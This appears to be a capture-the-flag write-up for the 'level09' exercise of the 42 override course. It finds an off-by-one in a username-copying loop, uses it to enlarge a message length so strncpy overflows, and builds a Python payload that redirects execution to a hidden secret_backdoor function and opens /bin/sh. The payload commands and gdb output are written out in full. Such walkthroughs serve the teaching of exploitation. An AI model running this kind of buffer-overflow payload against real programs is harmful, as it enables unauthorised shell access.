# Level09

    $ ./level09 
    --------------------------------------------
    |   ~Welcome to l33t-m$n ~    v1337        |
    --------------------------------------------
    >: Enter your username
    >>: coucou
    >: Welcome, coucou
    >: Msg @Unix-Dude
    >>: hello
    >: Msg sent!

The program send a message?

Start in GDB

The program fill a structure `message` with the username and message input. Using 2 functions `set_msg` and `set_username`

    struct s_message {
        char message[140];  /* message */
        char username[40];  /* message+140 */
        int len_message;    /* message+180 */
    };

The function `set_msg()` use `strncpy` to fill the structure, with the good size, no overflow possible

The function `set_username()` use a manual loop to fill the structure

    int i = 0; /* rbp-0x4 */
    while (i <= 40 && buffer[i] != 0) {
        message->username[i] = buffer[i];
        i++;
    }

The structure string is a buffer of `char[40]`. The loop start with `i = 0` and loop while `i <= 40`, so 41 times and not 40. This is an overflow

Also, there is a non used function in the program, called `secret_backdoor`

    (gdb) info functions
    All defined functions:

    Non-debugging symbols:
    ....
    0x000000000000088c  secret_backdoor
    0x00000000000008c0  handle_msg
    0x0000000000000932  set_msg
    0x00000000000009cd  set_username
    0x0000000000000aa8  main
    ....

This function ask an input and exec it with `system()`

    void secret_backdoor() {
        char buffer[128]; /* rbp-0x80 */

        fgets(buffer, 128, stdin);
        system(buffer);
        return;
    }

We can use the overflow of 1 on the struct string `username` to overflow the next struct variable : `len_message`. This variable control the strncpy on the `set_msg` function. if we put a big number inside, the strncpy will overflow and let us the space to exploit

Let's try it by injecting the biggest number we can in 1 byte : `255` == `0xff` == `\xff` 

    (40 bytes for username input) + (1 byte number to overwrite the len) + (\n for the next input) + (big string to segfault the strncpy)

    (gdb) r <<<$(python -c 'print "B"*40+"\xff"+"\n"+"A"*255')
    Starting program: /home/users/level09/level09 <<<$(python -c 'print "B"*40+"\xff"+"\n"+"A"*255')
    --------------------------------------------
    |   ~Welcome to l33t-m$n ~    v1337        |
    --------------------------------------------
    >: Enter your username
    >>: >: Welcome, BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB�>: Msg @Unix-Dude
    >>: >: Msg sent!

    Program received signal SIGSEGV, Segmentation fault.
    0x0000000000000000 in ?? ()

We had a segfault! Now search the offset to overwrite RBP. Using gdb-peda for have a good post-segfault report

    gdb-peda$ r <<<$(python -c 'print "B"*40+"\xff"+"\n"+"AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz"')

    Starting program: /home/nico/42/override/level09/Ressources/level09 <<<$(python -c 'print "B"*40+"\xff"+"\n"+"AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz"')
    --------------------------------------------
    |   ~Welcome to l33t-m$n ~    v1337        |
    --------------------------------------------
    >: Enter your username
    >>: >: Welcome, BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB�>: Msg @Unix-Dude
    >>: >: Msg sent!

    Program received signal SIGSEGV, Segmentation fault.
    [----------------------------------registers-----------------------------------]
    ....
    RBP: 0x7878787877777777 ('wwwwxxxx')
    RSP: 0x7fffffffe328 ("yyyyzzzz\n")
    RIP: 0x555555554931 (<handle_msg+113>:	ret)
    ....

The offset of RBP is 192

    $ ./get_offset.py 77777777
    wwww => offset = 192

We can add 8 to overwrite the RSP return -> 200

Get the `secret_backdoor` address

    (gdb) info function secret_backdoor
    All functions matching regular expression "secret_backdoor":

    Non-debugging symbols:
    0x000055555555488c  secret_backdoor


Build the payload and try it

    python -c 'print "B"*40+"\xff"+"\n"+"B"*200+"\x8c\x48\x55\x55\x55\x55\x00\x00"+"\n"+"/bin/sh"+"\n"'

    $ (python -c 'print "B"*40+"\xff"+"\n"+"B"*200+"\x8c\x48\x55\x55\x55\x55\x00\x00"+"\n"+"/bin/sh\n"'; cat) | ./level09 
    --------------------------------------------
    |   ~Welcome to l33t-m$n ~    v1337        |
    --------------------------------------------
    >: Enter your username
    >>: >: Welcome, BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB�>: Msg @Unix-Dude
    >>: >: Msg sent!
    whoami
    end



